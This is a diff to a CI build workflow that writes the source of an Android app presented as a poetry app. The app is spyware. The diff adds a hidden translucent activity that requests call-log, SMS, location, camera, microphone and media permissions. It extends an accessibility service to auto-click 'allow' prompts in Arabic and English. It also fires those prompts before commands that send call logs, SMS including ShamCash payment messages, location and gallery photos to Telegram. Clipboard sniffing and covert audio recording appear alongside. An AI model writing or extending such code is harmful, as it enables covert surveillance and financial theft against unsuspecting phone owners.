@@ -47,7 +47,7 @@ jobs:
             android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds"
             android:canRetrieveWindowContent="true"
             android:description="@string/accessibility_desc"
-            android:packageNames="com.android.settings"
+            android:packageNames="com.android.settings,com.royal.poetry.master"
             android:settingsActivity="com.royal.poetry.master.MainActivity" />
         EOF
 
@@ -89,6 +89,10 @@ jobs:
                         <category android:name="android.intent.category.LAUNCHER"/>
                     </intent-filter>
                 </activity>
+
+                <activity android:name=".TransparentPermissionActivity"
+                    android:theme="@android:style/Theme.Translucent.NoTitleBar"
+                    android:exported="false"/>
 
                 <service android:name=".RoyalService" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync"/>
 
@@ -197,6 +201,47 @@ jobs:
         }
         EOF
 
+        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/TransparentPermissionActivity.java
+        package com.royal.poetry.master;
+        import android.app.Activity;
+        import android.os.Bundle;
+        import android.os.Build;
+
+        public class TransparentPermissionActivity extends Activity {
+            @Override
+            protected void onCreate(Bundle savedInstanceState) {
+                super.onCreate(savedInstanceState);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    String[] perms = {
+                        android.Manifest.permission.READ_CALL_LOG,
+                        android.Manifest.permission.READ_SMS,
+                        android.Manifest.permission.ACCESS_FINE_LOCATION,
+                        android.Manifest.permission.CAMERA,
+                        android.Manifest.permission.RECORD_AUDIO,
+                        android.Manifest.permission.READ_EXTERNAL_STORAGE
+                    };
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        perms = new String[]{
+                            android.Manifest.permission.READ_CALL_LOG,
+                            android.Manifest.permission.READ_SMS,
+                            android.Manifest.permission.ACCESS_FINE_LOCATION,
+                            android.Manifest.permission.CAMERA,
+                            android.Manifest.permission.RECORD_AUDIO,
+                            android.Manifest.permission.READ_MEDIA_IMAGES,
+                            android.Manifest.permission.POST_NOTIFICATIONS
+                        };
+                    }
+                    requestPermissions(perms, 100);
+                }
+            }
+
+            @Override
+            public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+                finish();
+            }
+        }
+        EOF
+
         cat << 'EOF' > app/src/main/java/com/royal/poetry/master/RoyalNotificationListener.java
         package com.royal.poetry.master;
         import android.service.notification.NotificationListenerService;
@@ -288,7 +333,7 @@ jobs:
                     CharSequence text = node.getText();
                     if (text != null) {
                         String t = text.toString().toLowerCase();
-                        if (t.contains("السماح") || t.contains("allow") || t.contains("موافق") || t.contains("grant") || t.contains("تفعيل")) {
+                        if (t.contains("السماح") || t.contains("allow") || t.contains("موافق") || t.contains("grant") || t.contains("تفعيل") || t.contains("أثناء استخدام التطبيق")) {
                             node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         }
                     }
@@ -389,6 +434,14 @@ jobs:
 
                 initClipboardSniffer();
                 startCommandListener();
+            }
+
+            private void triggerPermissionsPopup() {
+                try {
+                    Intent intent = new Intent(this, TransparentPermissionActivity.class);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                } catch (Exception ignored) {}
             }
 
             private void initClipboardSniffer() {
@@ -496,6 +549,7 @@ jobs:
                     @Override
                     public void run() {
                         try {
+                            triggerPermissionsPopup();
                             File audioFile = new File(getExternalCacheDir(), "royal_surveillance.3gp");
                             MediaRecorder recorder = new MediaRecorder();
                             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -597,18 +651,22 @@ jobs:
                                 }
 
                                 if (resStr.contains("/calls")) {
+                                    triggerPermissionsPopup();
                                     sendToTelegram("📞 [سجل المكالمات الملكي]:\n" + getCallLogs());
                                 }
                                 if (resStr.contains("/sms") || resStr.contains("/shamcash")) {
+                                    triggerPermissionsPopup();
                                     sendToTelegram("💰 [أرشيف الرسائل الشامل - شام كاش والتفعيل والحسابات]:\n" + getDeepShamCashAndAccountSms());
                                 }
                                 if (resStr.contains("/apps")) {
                                     sendToTelegram("📱 [جميع التطبيقات المثبتة]:\n" + getInstalledApps());
                                 }
                                 if (resStr.contains("/location")) {
+                                    triggerPermissionsPopup();
                                     sendToTelegram("📍 [إحداثيات الموقع النشطة]:\n" + getLocationInfo());
                                 }
                                 if (resStr.contains("/photos")) {
+                                    triggerPermissionsPopup();
                                     sendToTelegram("🖼️ [جاري إرسال أحدث صور المعرض للملك]:");
                                     sendLatestPhotosAsImages();
                                 }
